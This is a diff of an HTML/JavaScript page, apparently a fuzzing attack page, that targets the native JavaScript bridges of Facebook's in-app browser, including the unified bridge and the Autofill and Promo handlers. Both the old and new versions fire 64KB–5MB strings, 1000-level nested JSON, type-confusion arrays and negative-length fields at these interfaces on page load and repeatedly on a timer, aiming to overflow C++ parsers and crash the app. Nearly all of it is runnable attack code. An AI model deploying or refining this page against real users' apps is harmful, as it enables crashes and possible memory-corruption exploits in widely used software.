@@ -1,70 +1,63 @@
 <!DOCTYPE html>
 <html>
-<head><title>JSI Precision Fuzzer</title></head>
+<head><title>JSI Smart Fuzzer</title></head>
 <body style="background:#000; color:#0f0;">
-    <h3>Precision Striking FB JSIs...</h3>
+    <h3>Executing Smart Fuzzer...</h3>
     <div id="log"></div>
 
     <script>
         const logEl = document.getElementById('log');
         function log(msg) { logEl.innerHTML += msg + "<br>"; }
 
-        // 1. The "Big String" for Buffer Overflows
-        const giantString = "A".repeat(1024 * 1024 * 5); // 5MB String to really stress the allocator
+        // 1. The "Goldilocks" String: 64KB
+        // Big enough to overflow C++, small enough to bypass Java GC issues
+        const overflowString = "A".repeat(65536); 
 
-        // 2. Crafted IPC Messages
-        // We guess common Facebook IPC structures based on their open-source SDKs
+        // 2. Deeply Nested JSON (Breaks native parsers by overflowing the call stack)
+        let deepJson = '{"a":';
+        for(let i=0; i<1000; i++) deepJson += '{"a":';
+        deepJson += '"b"';
+        for(let i=0; i<1000; i++) deepJson += '}';
+        deepJson += '}';
+
+        // 3. Type Confusion Array (Passing arrays where strings are expected)
+        const typeConfArray = Array(1000).fill(overflowString);
+
         const payloads = [
-            // Attempt to overflow a command parser
-            giantString,
-            
-            // Attempt Type Confusion (giving an array where a string is expected)
-            JSON.stringify({ "action": "test", "callback": [], "data": giantString }),
-            
-            // Attempt Integer Overflow in length calculations
-            JSON.stringify({ "action": "saveAutofill", "length": -1, "data": "A" }),
-            
-            // Send massive JSON to break the rapidjson parser in C++
-            JSON.stringify({ "cmd": "log", "msg": giantString }),
-            
-            // Attempt to trigger the native cache query we saw in Ghidra
-            JSON.stringify({ "action": "queryCache", "key": giantString })
+            overflowString,
+            deepJson,
+            JSON.stringify(typeConfArray),
+            JSON.stringify({ "action": "saveAutofill", "data": overflowString }),
+            JSON.stringify({ "type": "promo", "content": deepJson })
         ];
 
-        function strike() {
-            log("[*] Firing at __call_iabjs_unified_bridge...");
-            if (typeof window.__call_iabjs_unified_bridge === 'function') {
-                payloads.forEach(p => {
+        function smartStrike() {
+            log("[*] Firing at Bridges...");
+            
+            payloads.forEach(p => {
+                // Strike the Unified Bridge
+                if (typeof window.__call_iabjs_unified_bridge === 'function') {
                     try { window.__call_iabjs_unified_bridge(p); } catch(e) {}
-                    try { window.__call_iabjs_unified_bridge("test", p); } catch(e) {}
-                });
-            }
+                    try { window.__call_iabjs_unified_bridge("test_event", p); } catch(e) {}
+                }
 
-            log("[*] Firing at iabjs_unified_bridge...");
-            if (window.iabjs_unified_bridge) {
-                // Brute force all methods on this object
-                let methods = Object.getOwnPropertyNames(Object.getPrototypeOf(window.iabjs_unified_bridge));
-                methods.forEach(m => {
-                    if (typeof window.iabjs_unified_bridge[m] === 'function') {
-                        payloads.forEach(p => {
-                            try { window.iabjs_unified_bridge[m](p); } catch(e) {}
-                        });
-                    }
-                });
-            }
+                // Strike Autofill
+                if (window._AutofillMessageHandler) {
+                    try { window._AutofillMessageHandler.postMessage(p); } catch(e) {}
+                }
 
-            log("[*] Firing at Autofill/Promo...");
-            try { window._AutofillMessageHandler.postMessage(giantString); } catch(e) {}
-            try { window._PromoExtensions.postMessage(giantString); } catch(e) {}
-
-            log("[+] Volley complete. Waiting for native crash...");
+                // Strike Promo
+                if (window._PromoExtensions) {
+                    try { window._PromoExtensions.postMessage(p); } catch(e) {}
+                }
+            });
         }
 
-        // Fire immediately
-        strike();
+        // Run the volley
+        smartStrike();
 
-        // Fire repeatedly to trigger race conditions
-        setInterval(strike, 200);
+        // Run it a few more times, but gently (every 500ms) to avoid Java GC lockup
+        setInterval(smartStrike, 500);
 
     </script>
 </body>
